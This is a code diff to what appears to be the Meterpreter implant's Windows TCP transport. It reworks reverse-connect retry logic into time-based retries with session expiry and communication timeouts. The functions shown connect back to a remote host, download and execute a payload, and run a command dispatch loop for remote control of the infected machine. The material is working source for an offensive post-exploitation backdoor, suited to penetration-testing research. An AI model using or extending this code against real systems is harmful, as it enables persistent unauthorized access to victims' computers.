@@ -29,22 +29,36 @@ static LOCK ** ssl_locks = NULL;
  * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
  * @param sockAddr The SOCKADDR structure which contains details of the connection.
  * @param sockAddrSize The size of the \c sockAddr structure.
- * @param retryAttempts The number of times to retry the connection (-1 == INFINITE).
- * @param retryTimeout The number of milliseconds to wait for each connection attempt.
+ * @param retryTotal The number of seconds to continually retry for.
+ * @param retryWait The number of seconds between each connect attempt.
+ * @param expiry The session expiry time.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, int retryAttempts, DWORD retryTimeout)
+static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait, int expiry)
 {
 	DWORD result = ERROR_SUCCESS;
+	int start = current_unix_timestamp();
 	do
 	{
+		int retryStart = current_unix_timestamp();
 		if ((result = connect(reverseSocket, sockAddr, sockAddrSize)) != SOCKET_ERROR)
 		{
 			break;
 		}
 
-		Sleep(retryTimeout);
-	} while (retryAttempts == -1 || retryAttempts-- > 0);
+		// has our session expired?
+		if (current_unix_timestamp() >= expiry)
+		{
+			break;
+		}
+
+		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
+		int waited = current_unix_timestamp() - retryStart;
+		if ((DWORD)waited < retryWait)
+		{
+			Sleep((retryWait - (DWORD)waited) * 1000);
+		}
+	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
 
 	if (result == SOCKET_ERROR)
 	{
@@ -58,10 +72,12 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockA
  * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
  * @param host String containing the name or IP of the host to connect to.
  * @param port Port number to connect to.
- * @param retryAttempts The number of times to attempt to retry.
+ * @param retryTotal The number of seconds to continually retry for.
+ * @param retryWait The number of seconds between each connect attempt.
+ * @param expiry The session expiry time.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
+static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
 {
 	*socketBuffer = 0;
 
@@ -82,7 +98,7 @@ static DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, S
 	sock.sin_family = AF_INET;
 	sock.sin_port = htons(port);
 
-	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryAttempts, RETRY_TIMEOUT_MS);
+	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryTotal, retryWait, expiry);
 
 	if (result == ERROR_SUCCESS)
 	{
@@ -97,10 +113,12 @@ static DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, S
  * @param host String containing the name or IP of the host to connect to.
  * @param service The target service/port.
  * @param scopeId IPv6 scope ID.
- * @param retryAttempts The number of times to attempt to retry.
+ * @param retryTotal The number of seconds to continually retry for.
+ * @param retryWait The number of seconds between each connect attempt.
+ * @param expiry Session expiry time.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
+static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, int expiry, SOCKET* socketBuffer)
 {
 	*socketBuffer = 0;
 
@@ -132,8 +150,10 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 	}
 
 	DWORD result = ERROR_SUCCESS;
+	int start = current_unix_timestamp();
 	do
 	{
+		int retryStart = current_unix_timestamp();
 		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
 		{
 			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;
@@ -147,8 +167,19 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 			}
 		}
 
-		Sleep(RETRY_TIMEOUT_MS);
-	} while (retryAttempts == -1 || retryAttempts-- > 0);
+		// has our session expired?
+		if (current_unix_timestamp() >= expiry)
+		{
+			break;
+		}
+
+		dprintf("[TCP RUN] Connection failed, sleeping for %u s", retryWait);
+		int waited = current_unix_timestamp() - retryStart;
+		if ((DWORD)waited < retryWait)
+		{
+			Sleep((retryWait - (DWORD)waited) * 1000);
+		}
+	} while (((DWORD)current_unix_timestamp() - (DWORD)start) < retryTotal);
 
 	closesocket(socketHandle);
 	freeaddrinfo(addresses);
@@ -386,7 +417,7 @@ static VOID server_socket_flush(Remote* remote)
 /*!
  * @brief Poll a socket for data to recv and block when none available.
  * @param remote Pointer to the remote instance.
- * @param timeout Amount of time to wait before the poll times out.
+ * @param timeout Amount of time to wait before the poll times out (in milliseconds).
  * @return Indication of success or failure.
  */
 static LONG server_socket_poll(Remote* remote, long timeout)
@@ -568,6 +599,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
  */
 static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 {
+	Transport* transport = remote->transport;
 	BOOL running = TRUE;
 	LONG result = ERROR_SUCCESS;
 	Packet * packet = NULL;
@@ -582,6 +614,7 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 		return result;
 	}
 
+	int lastPacket = current_unix_timestamp();
 	while (running)
 	{
 		if (event_poll(dispatchThread->sigterm, 0))
@@ -602,8 +635,22 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 
 			running = command_handle(remote, packet);
 			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
+
+			// packet received, reset the timer
+			lastPacket = current_unix_timestamp();
 		}
-		else if (result < 0)
+		else if (result == 0)
+		{
+			// check if the communication has timed out, or the session has expired, so we should terminate the session
+			int now = current_unix_timestamp();
+			if (now > transport->expiration_end || (now - lastPacket) > transport->comms_timeout)
+			{
+				result = ERROR_SUCCESS;
+				dprintf("[DISPATCH] communications has timed out/session has ended");
+				break;
+			}
+		}
+		else
 		{
 			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
 			break;
@@ -817,9 +864,11 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 
 	dprintf("[TCP CONFIGURE] Url: %S", remote->transport->url);
 
+	remote->transport->start_time = current_unix_timestamp();
+	remote->transport->comms_last_packet = current_unix_timestamp();
+
 	if (strncmp(asciiUrl, "tcp", 3) == 0)
 	{
-		const int iRetryAttempts = 30;
 		char* pHost = strstr(asciiUrl, "//") + 2;
 		char* pPort = strrchr(pHost, ':') + 1;
 
@@ -830,7 +879,8 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 			*(pScopeId - 1) = '\0';
 			*(pPort - 1) = '\0';
 			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
-			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
+			result = reverse_tcp6(pHost, pPort, atol(pScopeId), remote->transport->retry_total,
+				remote->transport->retry_wait, remote->transport->expiration_end, &ctx->fd);
 		}
 		else
 		{
@@ -847,7 +897,8 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 			{
 				*(pPort - 1) = '\0';
 				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
-				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
+				result = reverse_tcp4(pHost, usPort, remote->transport->retry_total, remote->transport->retry_wait,
+					remote->transport->expiration_end, &ctx->fd);
 			}
 		}
 	}
@@ -858,7 +909,7 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 		// recreate that this time around.
 		int retryAttempts = 30;
 
-		dprintf("[STAGED] Attempted to reconnect based on inference from previous staged connection");
+		dprintf("[STAGED] Attempted to reconnect based on inference from previous staged connection (size %u)", ctx->sock_desc_size);
 
 		// check if we should do bind() or reverse()
 		if (ctx->bound)
@@ -873,7 +924,8 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 			dprintf("[STAGED] previous connection was a reverse connection");
 			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
 
-			result = reverse_tcp_run(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, retryAttempts, RETRY_TIMEOUT_MS);
+			result = reverse_tcp_run(ctx->fd, (SOCKADDR*)&ctx->sock_desc, ctx->sock_desc_size, remote->transport->retry_total,
+				remote->transport->retry_wait, remote->transport->expiration_end);
 
 			if (result != ERROR_SUCCESS)
 			{
@@ -892,8 +944,11 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 
 	if (result != ERROR_SUCCESS)
 	{
+		dprintf("[SERVER] Something went wrong %u", result);
 		return FALSE;
 	}
+
+	dprintf("[SERVER] Looking good, FORWARD!");
 
 	// Do not allow the file descriptor to be inherited by child processes
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
@@ -919,9 +974,14 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 /*!
  * @brief Creates a new TCP transport instance.
  * @param url URL containing the transport details.
+ * @param expirationTime The time used for session expiration.
+ * @param commsTimeout The timeout used for individual communications.
+ * @param retryTotal The total number of seconds to continue trying to reconnect comms.
+ * @param retryWait The number of seconds to wait between each reconnect attempt.
  * @return Pointer to the newly configured/created TCP transport instance.
  */
-Transport* transport_create_tcp(wchar_t* url)
+Transport* transport_create_tcp(wchar_t* url, int expirationTime, int commsTimeout,
+	UINT retryTotal, UINT retryWait)
 {
 	Transport* transport = (Transport*)malloc(sizeof(Transport));
 	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
@@ -931,6 +991,7 @@ Transport* transport_create_tcp(wchar_t* url)
 	memset(transport, 0, sizeof(Transport));
 	memset(ctx, 0, sizeof(TcpTransportContext));
 
+	transport->type = METERPRETER_TRANSPORT_SSL;
 	transport->url = _wcsdup(url);
 	transport->packet_receive = packet_receive_via_ssl;
 	transport->packet_transmit = packet_transmit_via_ssl;
@@ -941,7 +1002,13 @@ Transport* transport_create_tcp(wchar_t* url)
 	transport->server_dispatch = server_dispatch_tcp;
 	transport->get_socket = transport_get_socket_tcp;
 	transport->ctx = ctx;
-	transport->type = METERPRETER_TRANSPORT_SSL;
+	transport->expiration_time = expirationTime;
+	transport->expiration_end = current_unix_timestamp() + expirationTime;
+	transport->comms_timeout = commsTimeout;
+	transport->start_time = current_unix_timestamp();
+	transport->comms_last_packet = current_unix_timestamp();
+	transport->retry_total = retryTotal;
+	transport->retry_wait = retryWait;
 
 	return transport;
 }
